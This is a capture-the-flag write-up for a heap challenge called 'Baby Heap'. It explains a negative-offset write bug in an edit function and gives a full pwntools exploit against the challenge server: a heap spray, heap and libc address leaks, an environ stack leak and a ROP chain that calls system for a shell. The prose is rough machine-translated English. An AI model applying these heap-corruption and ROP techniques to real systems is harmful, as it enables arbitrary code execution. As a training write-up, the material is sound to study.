---
title: "Baby Heap - Alfarahidi CTF"
tags:
  - Pwn
  - CTF 
  - heap
---

# Description:

It's not baby heap lol 


# Overview:

During the initialization phase, [0,15] memory pages were randomly lifted, and a tcache list with a starting size of 0x291 was also created, which was well received. 

Then randomly allocate 16 chunks of sum `0x10`and `0x28`size on the heap, respectively as `header`and `data`, the data structure is as follows. 

```c
- header:
    
    0x0: size ( ***signed*** long long)
    
    0x8: ptr (char*)
    
- data:
    
    0x0: data (char[0x28])
```

There will be no new malloc behavior from now on.

In the allocation stage, randomly pick one from each `header`and `data`put it into the list on bss. The entire process applies to more than 16 direct `exit(0)`.

Deletion also clears `header`the pointer in, and there is no UAF.

`show`When using the function `write(1,header->ptr,header->size)`, you can ignore 0 and truncate the leaked information.

**Vulnerability point analysis :** 

`edit`In the function, `offset`there is no check for negative numbers, which results in arbitrary writing to lower addresses on the heap, specifically `header->ptr[offset]`.

Because the sum of the heap `header`is `data`initialized `malloc`, the addresses are consecutive and only `add`randomly assigned during the process. Therefore, there is a higher probability `header`that it will be `data`adjacent.

- The total size of the large heap blocks allocated during initialization is always a multiple of 0x1000, which will only affect heap_base in units of memory pages and will have little impact on our next use.

Then we can start spraying. Assume that there is at least one `header`and `data`adjacent, find any one `data`, modify its adjacent `header`size field forward, and then stack `show`all the blocks one by one. If the assumption is true, we will receive data with a length greater than 0x28 .

In this way, we can get the address on the heap and then `header`the `data`address of the page where it is located.

Remember that the randomly selected heap block id is `random_idx`, and find `show`the heap block id that can produce data `target_idx`.

Then we clear the lower 12 bits `random_idx`of `header->data`the pointer to zero, and then get the memory distribution of the entire page.

Next we consider how to get libc.

Since the deletion process will delete the pointer, we cannot directly use `random_idx`the sum used in the previous step *target_idx*. We need to control another pointer to point to the heap block of size 0xd60 allocated during the initialization phase.

We can randomly pick one with *random_idx* different *target_idx* IDs *header*, find the one that corresponds to it *data*, calculate the distance between this *header*  and *data* the other, and then we will get another controllable one `header`, and further use it to complete the free of large blocks.

It is very simple to construct arbitrary reading and writing. You can change and write at will with the `random_idx`and `target_idx`.

With libc and arbitrary reading and writing, you can consider how to getshell.

`main`It's OK `return 0`, consider leaking env and stacking it.

Although the local hit probability is not very high (the physical sense is less than 50%), the remote hit probability is still quite high. I hit it three times.

```python
from pwn import *
context(arch='amd64', os='linux', log_level='info')
#s=process('./src/pwn')
#s=remote("localhost",10002)
s = remote('15.237.60.47',10002)
elf=ELF('./src/pwn')
libc=ELF("./src/libc.so.6")

def menu(choice):
    s.sendlineafter(b"choice: ",str(choice).encode())
def add(idx,content=b"/bin/sh\x00"):
    menu(1)
    s.sendlineafter(b"idx: ",str(idx).encode())
    s.sendlineafter(b"data: ",content)

def edit(idx,off,content):
    menu(2)
    s.sendlineafter(b"idx: ",str(idx).encode())
    s.sendlineafter(b"offset: ",str(off).encode())
    s.sendlineafter(b"data: ",content)

def show(idx):
    menu(3)
    s.sendlineafter(b"idx: ",str(idx).encode())
    s.recvuntil(b"Data: ")
    return s.recvline()[:-1]

def delete(idx):
    menu(4)
    s.sendlineafter(b"idx: ",str(idx).encode())

def test(dat):
    context.log_level="info"
    tests=process("./pwn")
    context.log_level="debug"
    tests.send(dat)
    context.log_level="info"
    tests.close()
    context.log_level="debug"

if __name__=="__main__":
   # pause()
    # spray heap with idx, binsh seems useless
    for i in range(0x10):
        add(i,p64(0xd0+i)+b"/bin/sh\x00")
    # randomly choose an header, modify its neighbour header->size
    # to a bigger one, prepare to leak when show
    edit(3,-0x20,b"\x90\x21")
    # try hit, if hit, then data len should be the length we set
    # in our previous step
    flag=0
    target_idx=0
    for i in range(0x10):
        dat=show(i)
        if len(dat)!=0x28:
            info(hex(len(dat)))
            flag=1
            target_idx=i
            break
    if not flag:
        error("failed to leak")

    # clear low 12 bits to zero, show from "heap base"
    # then we can know what's on mem
    pos=dat.find(p64(0x28))
    heap_base=u64(dat[pos+8:pos+16])&(~0xfff)
    info(hex(heap_base))
    edit(3,-0x18,p64(heap_base)[:6])
    dat=show(target_idx)

    # choose the first header, and try to find its data and modify
    # its ptr to 0xd71 chunks malloced in init phase.
    # There's some simple assertions.
    # Can be removed if you scan other ptrs on heap when the first failed.
    pos=dat.find(b"\x56")
    if pos==-1:
        pos=dat.find(b"\x55")
    if pos==-1:
        error("failed to find heap ptr")
    pos-=5
    heap_ptr=u64(dat[pos:pos+8])&(0xfff)
    evil_idx=u64(dat[heap_ptr:heap_ptr+8])-0xd0
    if evil_idx<0 or evil_idx>0x10:
        error("failed to find evil idx")
    info(hex(evil_idx))
    if pos-heap_ptr>0:
        error("fail to calc offset")
    

    edit(evil_idx,pos-heap_ptr,p64(heap_base-0xd70+0x10)[:6])
    delete(evil_idx)
    edit(3,-0x18,p64(heap_base-0xd70+0x10)[:6])
    dat=show(target_idx)
    libc.address=u64(dat[:8])-(0x7f5fc9912ce0-0x7f5fc96f9000)
    success(hex(libc.address))

    # Now we get libc base, leak environ then attack stack
    # should be a good idea.

	    edit(3,-0x18,p64(libc.sym.environ)[:6])
    stack=u64(show(target_idx)[:8])
    success(hex(stack))

    target=stack+(0x7ffd0cee3c38-0x7ffd0cee3d58)+8
    edit(3,-0x18,p64(target)[:6])
    edit(target_idx,-8,p64(libc.address+0x000000000002a3e5+1)[:6])
    edit(target_idx,0,p64(libc.address+0x000000000002a3e5)[:6])
    edit(target_idx,8,p64(libc.address+0x00000000001d8698)[:6])
    edit(target_idx,0x10,p64(libc.sym.system)[:6])
    s.interactive()
```
